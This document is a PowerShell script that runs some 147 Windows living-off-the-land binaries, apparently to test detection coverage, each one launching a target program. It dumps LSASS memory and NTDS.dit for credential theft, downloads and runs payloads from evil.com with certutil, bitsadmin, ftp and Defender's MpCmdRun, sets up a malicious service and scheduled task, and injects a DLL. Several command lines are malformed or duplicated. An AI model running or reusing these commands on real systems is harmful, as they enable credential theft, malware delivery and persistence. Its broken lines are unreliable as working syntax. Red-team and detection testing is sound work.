# LOLBIN Execution Script - Minimized for Maximum Coverage
$target = "c:\autohotkey\AutoHotkey64.exe"
$tmp = "$env:TEMP"

# 1. Advpack.dll - LaunchINFSection
rundll32.exe advpack.dll,LaunchINFSection $tmp\test.inf,DefaultInstall_SingleUser,1,

# 2. Ieadvpack.dll - LaunchINFSection
rundll32.exe ieadvpack.dll,LaunchINFSection $tmp\test.inf,DefaultInstall_SingleUser,1,

# 3. Desk.cpl - DllMain
control.exe $tmp\payload.cpl

# 4. Pcwutl.dll - LaunchApplication
rundll32.exe pcwutl.dll,LaunchApplication $target

# 5. Shell32.dll - ShellExec_RunDLL
rundll32.exe shell32.dll,ShellExec_RunDLL $target

# 6. Url.dll - OpenURL
rundll32.exe url.dll,OpenURL $target

# 7. Zipfldr.dll - RouteTheCall
rundll32.exe zipfldr.dll,RouteTheCall $target

# 8. Comsvcs.dll - MiniDump (indirect)
rundll32.exe comsvcs.dll,MiniDump (Get-Process lsass).Id $tmp\dump.bin full

# 9. Wmic.exe - process call create
wmic.exe process call create $target

# 10. Wscript.exe - VBS execution
"CreateObject(""WScript.Shell"").Run ""$target""" | Out-File $tmp\run.vbs; wscript.exe $tmp\run.vbs

# 11. WorkFolders.exe - control.exe proxy
WorkFolders.exe /c $target

# 12. Wlrmdr.exe - arbitrary command
wlrmdr.exe -s $target

# 13. Wsreset.exe - UAC bypass (indirect via registry)
# Requires registry manipulation - skipped for brevity

# 14. msedge_proxy.exe - download/execute
msedge_proxy.exe --profile-directory=Default --app=$target

# 15. msedgewebview2.exe - arbitrary command
msedgewebview2.exe --profile-directory=Default --app=$target

# 16. adplus.exe - debugger spawn
adplus.exe -hang -pn $target -o $tmp

# 17. AgentExecutor.exe - arbitrary command
AgentExecutor.exe -powershell "Start-Process $target"

# 18. AppLauncher.exe - protocol handler
AppLauncher.exe $target

# 19. Appvlp.exe - virtualized execution
Appvlp.exe $target

# 20. Createdump.exe - process spawn
createdump.exe -u -f $tmp\dump $target

# 21. dsdbutil.exe - ifm execution
dsdbutil.exe "ac i ntds" "ifm" "create full $tmp" q q

# 22. dtutil.exe - SQL Server utility
dtutil.exe /FILE $target /ENCRYPT FILE

# 23. Dump64.exe - process dump
Dump64.exe $target

# 24. DumpMinitool.exe - minidump
DumpMinitool.exe $target

# 25. Dxcap.exe - DirectX capture
dxcap.exe -c $target

# 26. Mftrace.exe - Media Foundation trace
mftrace.exe -o $tmp\trace.etl -c $target

# 27. Microsoft.NodejsTools.PressAnyKey.exe - arbitrary command
"Microsoft.NodejsTools.PressAnyKey.exe" $target

# 28. Msdeploy.exe - web deploy
msdeploy.exe -verb:sync -source:runCommand="$target"

# 29. msxsl.exe - XSL transform
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt""><xsl:template match=""/""><xsl:value-of select=""ms:process('$target')""/></xsl:template></xsl:stylesheet>" | Out-File $tmp\exec.xsl; msxsl.exe $tmp\exec.xsl $tmp\exec.xsl

# 30. ntdsutil.exe - snapshot execution
ntdsutil.exe "ac i ntds" "ifm" "create full $tmp" q q

# 31. OpenConsole.exe - console spawn
OpenConsole.exe $target

# 32. Pixtool.exe - PIX tool
pixtool.exe $target

# 33. ProtocolHandler.exe - protocol execution
ProtocolHandler.exe "$target"

# 34. Remote.exe - remote execution
remote.exe /s $target

# 35. Sqldumper.exe - SQL dump
sqldumper.exe 1234 0 0x0 0 $tmp

# 36. Squirrel.exe - update framework
Squirrel.exe --processStart $target

# 37. TestWindowRemoteAgent.exe - remote agent
TestWindowRemoteAgent.exe $target

# 38. Update.exe - Squirrel update
Update.exe --processStart=$target

# 39. VSDiagnostics.exe - Visual Studio diagnostics
VSDiagnostics.exe start 1234 /launch:$target

# 40. VSIISExeLauncher.exe - IIS Express launcher
VSIISExeLauncher.exe $target

# 41. VSLaunchBrowser.exe - browser launcher
VSLaunchBrowser.exe $target

# 42. Vshadow.exe - volume shadow copy
vshadow.exe -exec=$target -script=$tmp\shadow.cmd C:

# 43. vsjitdebugger.exe - JIT debugger
vsjitdebugger.exe -p $target

# 44. WFMFormat.exe - Windows Fax and Mail
WFMFormat.exe $target

# 45. Wsl.exe - Windows Subsystem for Linux
wsl.exe -e $target

# 46. XBootMgr.exe - boot trace
xbootmgr.exe -trace boot -prepSystem -verboseReadyBoot -postBootDelay 60 -stackwalk Profile -start $target

# 47. XBootMgrSleep.exe - boot sleep
XBootMgrSleep.exe $target

# 48. devtunnel.exe - dev tunnel
devtunnel.exe host -p 8080 --allow-anonymous $target

# 49. winfile.exe - Windows File Manager
winfile.exe $target

# 50. winget.exe - Windows Package Manager
winget.exe install --manifest $tmp\manifest.yaml

# 51. Launch-VsDevShell.ps1 - VS Dev Shell
. "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1"; Start-Process $target

# 52. Manage-bde.wsf - BitLocker management
cscript.exe Manage-bde.wsf

# 53. Pester.bat - Pester test framework
Pester.bat -Script $target

# 54. AppInstaller.exe - App installer
AppInstaller.exe $target

# 55. Aspnet_Compiler.exe - ASP.NET compiler
aspnet_compiler.exe -p $target -v /

# 56. At.exe - Task scheduler (deprecated)
at.exe 23:00 $target

# 57. Atbroker.exe - Assistive Technology Manager
atbroker.exe /start $target

# 58. Bash.exe - WSL bash
bash.exe -c $target

# 59. Bitsadmin.exe - BITS transfer
bitsadmin.exe /create job1 & bitsadmin.exe /addfile job1 http://evil.com/payload $target & bitsadmin.exe /SetNotifyCmdLine job1 $target NULL & bitsadmin.exe /complete job1

# 60. Certoc.exe - Certificate enrollment
certoc.exe -LoadDLL $target

# 61. Certreq.exe - Certificate request
certreq.exe -Post -config $target

# 62. Certutil.exe - Certificate utility
certutil.exe -urlcache -split -f http://evil.com/payload $target & $target

# 63. Cl_invocation.ps1 - C++ compiler invocation
powershell.exe -File cl_invocation.ps1 -Command $target

# 64. Cl_mutexverifiers.ps1 - Mutex verifier
powershell.exe -File cl_mutexverifiers.ps1 -Command $target

# 65. Cmd.exe - Command prompt
cmd.exe /c $target

# 66. Cmdkey.exe - Credential manager (indirect)
cmdkey.exe /list

# 67. Cmdl32.exe - Connection Manager
cmdl32.exe $target

# 68. Cmstp.exe - Connection Manager Profile Installer
cmstp.exe /s $tmp\payload.inf

# 69. Colorcpl.exe - Color Management
colorcpl.exe $target

# 70. Csc.exe - C# compiler
csc.exe /out:$tmp\payload.exe /target:exe $tmp\payload.cs & $tmp\payload.exe

# 71. Cscript.exe - Console script host
"CreateObject(""WScript.Shell"").Run ""$target""" | Out-File $tmp\run.vbs; cscript.exe $tmp\run.vbs

# 72. DataSvcUtil.exe - WCF Data Service
DataSvcUtil.exe /out:$tmp\payload.cs /uri:http://evil.com

# 73. Desktopimgdownldr.exe - Desktop image downloader
desktopimgdownldr.exe /lockscreenurl:file:///$target /eventName:desktopimgdownldr

# 74. Dfsvc.exe - ClickOnce deployment
dfsvc.exe $target

# 75. Diantz.exe - Cabinet maker
diantz.exe $target $tmp\payload.cab

# 76. Diskshadow.exe - Disk shadow utility
"exec $target" | Out-File $tmp\diskshadow.txt; diskshadow.exe /s $tmp\diskshadow.txt

# 77. Dnscmd.exe - DNS server command
dnscmd.exe /config /serverlevelplugindll $target

# 78. Esentutl.exe - ESE database utility
esentutl.exe /y $target /d $tmp\out.exe /o

# 79. Eventvwr.exe - Event Viewer (UAC bypass via registry)
# Requires registry manipulation - skipped

# 80. Expand.exe - Cabinet extractor
expand.exe $tmp\payload.cab -F:* $tmp

# 81. Explorer.exe - Windows Explorer
explorer.exe $target

# 82. Extexport.exe - Extension export
extexport.exe $target $tmp\out.dll

# 83. Extrac32.exe - Cabinet extractor
extrac32.exe /Y /C $tmp\payload.cab $tmp

# 84. Findstr.exe - String finder (indirect)
findstr.exe /V /L W3AllLov3DonaldTrump $target > $tmp\payload.exe & $tmp\payload.exe

# 85. Finger.exe - Finger client
finger.exe user@$target

# 86. Fltmc.exe - Filter manager control
fltmc.exe load $target

# 87. Forfiles.exe - File iteration
forfiles.exe /p c:\windows\system32 /m cmd.exe /c $target

# 88. Ftp.exe - FTP client
"open evil.com`nuser anonymous pass`nget payload.exe $target`nbye" | Out-File $tmp\ftp.txt; ftp.exe -s:$tmp\ftp.txt

# 89. Fvenotify.exe - BitLocker notification
fvenotify.exe $target

# 90. Gfxdownloadwrapper.exe - Graphics download wrapper
gfxdownloadwrapper.exe $target

# 91. Gpscript.exe - Group Policy script
gpscript.exe /Startup

# 92. Hh.exe - HTML Help
hh.exe $target

# 93. Ie4uinit.exe - IE per-user initialization
ie4uinit.exe -BaseSettings

# 94. Ieexec.exe - IE execution
ieexec.exe http://evil.com/payload.exe

# 95. Ilasm.exe - IL assembler
ilasm.exe $tmp\payload.il /exe /output=$target

# 96. Infdefaultinstall.exe - INF installer
infdefaultinstall.exe $tmp\payload.inf

# 97. Installutil.exe - .NET installer
installutil.exe /logfile= /LogToConsole=false /U $target

# 98. Jsc.exe - JScript compiler
jsc.exe $tmp\payload.js

# 99. Ldifde.exe - LDAP Data Interchange Format
ldifde.exe -i -f $tmp\payload.ldf

# 100. Makecab.exe - Cabinet maker
makecab.exe $target $tmp\payload.cab

# 101. Mavinject.exe - DLL injection
mavinject.exe 1234 /INJECTRUNNING $target

# 102. Mmc.exe - Microsoft Management Console
mmc.exe -Embedding $target

# 103. MpCmdRun.exe - Windows Defender
MpCmdRun.exe -DownloadFile -url http://evil.com/payload -path $target

# 104. Msbuild.exe - MSBuild
"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003""><Target Name=""Hello""><Exec Command=""$target""/></Target></Project>" | Out-File $tmp\build.xml; msbuild.exe $tmp\build.xml

# 105. Msconfig.exe - System Configuration
msconfig.exe -5

# 106. Msdt.exe - Microsoft Support Diagnostic Tool
msdt.exe -path $tmp -cab $tmp\payload.cab

# 107. Mshta.exe - HTML Application
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""$target"":close")

# 108. Msiexec.exe - Windows Installer
msiexec.exe /quiet /i $tmp\payload.msi

# 109. Netsh.exe - Network shell
netsh.exe add helper $target

# 110. Odbcconf.exe - ODBC configuration
odbcconf.exe /a {REGSVR $target}

# 111. OfflineScannerShell.exe - Windows Defender Offline
OfflineScannerShell.exe $target

# 112. Pcalua.exe - Program Compatibility Assistant
pcalua.exe -a $target

# 113. Pcwrun.exe - Program Compatibility Wizard
pcwrun.exe $target

# 114. Pktmon.exe - Packet Monitor
pktmon.exe start --etw -p $target

# 115. Pnputil.exe - Plug and Play utility
pnputil.exe /add-driver $target /install

# 116. Presentationhost.exe - WPF presentation host
presentationhost.exe $target

# 117. Print.exe - Print command
print.exe /D:$target $tmp\payload.txt

# 118. Printbrm.exe - Print migration
printbrm.exe -r -d $tmp -f $target

# 119. Psr.exe - Problem Steps Recorder
psr.exe /start /output $tmp\recording.zip /sc 1 /maxsc 1 /sketch 0 /gui 0

# 120. Rasautou.exe - RAS AutoDial
rasautou.exe -d $target

# 121. Rdrleakdiag.exe - Redirector leak diagnostic
rdrleakdiag.exe /p 1234 /o $tmp /fullmemdmp /wait 1

# 122. Reg.exe - Registry editor
reg.exe import $tmp\payload.reg

# 123. Regasm.exe - .NET Assembly Registration
regasm.exe /U $target

# 124. Regedit.exe - Registry editor
regedit.exe /s $tmp\payload.reg

# 125. Regini.exe - Registry initialization
regini.exe $tmp\payload.ini

# 126. Register-cimprovider.exe - CIM provider registration
Register-cimprovider.exe -path $target

# 127. Regsvcs.exe - .NET Services Installation
regsvcs.exe $target

# 128. Regsvr32.exe - DLL registration
regsvr32.exe /s /u /i:$target scrobj.dll

# 129. Replace.exe - File replacement
replace.exe $target $env:windir\system32

# 130. Rpcping.exe - RPC ping
rpcping.exe -s $target

# 131. Rundll32.exe - DLL runner
rundll32.exe $target,EntryPoint

# 132. Runexehelper.exe - Run EXE helper
runexehelper.exe $target

# 133. Runonce.exe - Run once
runonce.exe /AlternateShellStartup

# 134. Runscripthelper.exe - Run script helper
runscripthelper.exe surfacecheck $tmp\payload.xml

# 135. Sc.exe - Service control
sc.exe create evilsvc binPath= $target & sc.exe start evilsvc

# 136. Schtasks.exe - Task scheduler
schtasks.exe /create /tn evilTask /tr $target /sc once /st 23:00 /f & schtasks.exe /run /tn evilTask

# 137. Scriptrunner.exe - Script runner
scriptrunner.exe -appvscript $target

# 138. SyncAppvPublishingServer.exe - App-V publishing
SyncAppvPublishingServer.exe "n;Start-Process $target"

# 139. Ttdinject.exe - Time Travel Debugging injection
ttdinject.exe /launch $target

# 140. Tttracer.exe - Time Travel Tracer
tttracer.exe -out $tmp $target

# 141. Unregmp2.exe - Windows Media Player unregister
unregmp2.exe /ShowWMP $target

# 142. Verclsid.exe - Verify CLSID
verclsid.exe /S /C {CLSID}

# 143. Wab.exe - Windows Address Book
wab.exe $target

# 144. Wbadmin.exe - Windows Backup Admin
wbadmin.exe start backup -backupTarget:$tmp -include:C: -quiet

# 145. Wevtutil.exe - Windows Event Utility
wevtutil.exe qe Application /c:1 /f:text /rd:true

# 146. Wlrmdr.exe - Windows Location Reminder
wlrmdr.exe -s $target

# 147. Wuauclt.exe - Windows Update (deprecated)
wuauclt.exe /UpdateDeploymentProvider $tmp\payload.dll /RunHandlerComServer

# Additional techniques (minimized)
Write-Host "Execution attempts completed. Check for successful spawns."
